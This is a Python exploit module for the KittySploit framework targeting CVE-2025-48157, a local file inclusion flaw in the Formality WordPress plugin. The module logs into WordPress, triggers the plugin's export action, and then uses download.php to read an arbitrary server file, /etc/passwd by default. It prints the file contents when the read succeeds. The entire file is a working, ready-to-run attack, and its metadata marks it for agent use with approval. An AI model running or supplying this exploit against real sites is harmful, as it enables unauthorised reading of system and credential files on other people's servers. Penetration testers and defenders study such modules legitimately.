#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Formality CVE-2025-48157 — authenticated download.php LFI."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Formality CVE-2025-48157 LFI read",
        "description": (
            "Logs in, touches export_formality_result, reads file via download.php wproot/file."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-48157"],
        "tags": ["wordpress", "formality", "lfi", "cve-2025-48157"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    username = OptString("", "WordPress username", required=True)
    password = OptString("", "WordPress password", required=True)
    wproot = OptString("/var/www/html", "wproot query parameter", required=False)
    read_file = OptString("/etc/passwd", "file parameter", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        user = (self.username or "").strip()
        pwd = (self.password or "").strip()
        if not user or not pwd:
            print_error("username and password required")
            return False
        self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            headers={"Cookie": "wordpress_test_cookie=WP Cookie check"},
            data={"log": user, "pwd": pwd, "wp-submit": "Log In", "testcookie": "1"},
            allow_redirects=True,
        )
        self.http_request(
            method="GET",
            path=self._join("/wp-admin/admin.php"),
            params={"action": "export_formality_result", "form_id": "1"},
            allow_redirects=False,
        )
        lfi = self.http_request(
            method="GET",
            path=self._join("/wp-content/uploads/formality/storage/download.php"),
            params={"wproot": self.wproot or "/var/www/html", "file": self.read_file or "/etc/passwd"},
            allow_redirects=False,
        )
        body = lfi.text or "" if lfi else ""
        if lfi and int(lfi.status_code or 0) == 200 and "root:" in body:
            print_success("LFI read succeeded")
            print_status(body[:600])
            return True
        print_error("LFI read failed")
        return False
